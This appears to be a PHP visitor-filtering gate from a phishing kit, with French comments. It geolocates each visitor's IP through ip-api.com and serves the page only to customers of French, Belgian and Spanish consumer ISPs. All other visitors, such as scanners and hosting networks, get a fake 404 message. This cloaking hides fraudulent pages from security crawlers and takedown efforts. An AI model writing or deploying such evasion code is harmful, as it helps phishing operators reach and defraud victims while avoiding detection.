<?php 
include 'settings.php';
if(!isset($_SESSION)){
    session_start();  // Et on ouvre la session
} 
if($test_mode){
  $ip = "128.78.14.206";
}
else{
  $ip = $_SERVER['REMOTE_ADDR']; 
}
function getIpInfo($ip = '') { 
    $ipinfo = file_get_contents("http://ip-api.com/json/$ip"); 
    $ipinfo_json = json_decode($ipinfo, true); 
    return $ipinfo_json; 
} 
    if($test_mode){
      $visitor_ip = "128.78.14.206";
    }
    else{
      $visitor_ip = $_SERVER['REMOTE_ADDR']; 
    }
    $ipinfo_json = getIpInfo($visitor_ip); 
  if($ipinfo_json['status'] != 'fail'){
    $org = "{$ipinfo_json['as']}"; // On récupère l'oprateur
    $isps = "{$ipinfo_json['isp']}"; // La mem 
  }
  else{
    $org = "Introuvable";
    $isps = "Introuvable";
  }
 
if(strpos(strtolower($org),"bouygues") || strpos(strtolower($org),"orange") || strpos(strtolower($org),"bbox") || strpos(strtolower($org),"red") || strpos(strtolower($org),"sfr") || strpos(strtolower($org),"free") || strpos(strtolower($org),"proxad") || strpos(strtolower($org),"proximus") || strpos(strtolower($org),"wanadoo") || strpos(strtolower($org),"numericable") || strpos(strtolower($org),"belgacom") || strpos(strtolower($org),"sosh") || strpos(strtolower($org),"poste") || strpos(strtolower($org),"telenet") || strpos(strtolower($org),"scarlet") || strpos(strtolower($org),"base") || strpos(strtolower($org),"lycamobile") || strpos(strtolower($org),"pandora") || strpos(strtolower($org),"viking") || strpos(strtolower($org),"movistar") || strpos(strtolower($org),"vodafone") || strpos(strtolower($org),"yoigo") || strpos(strtolower($org),"telefonica") || strpos($org,"Num\303\251ris") || $ip == "::1") { 
} 
else{ 
  die('HTTP/1.0 404 Not Found'); 
}
?>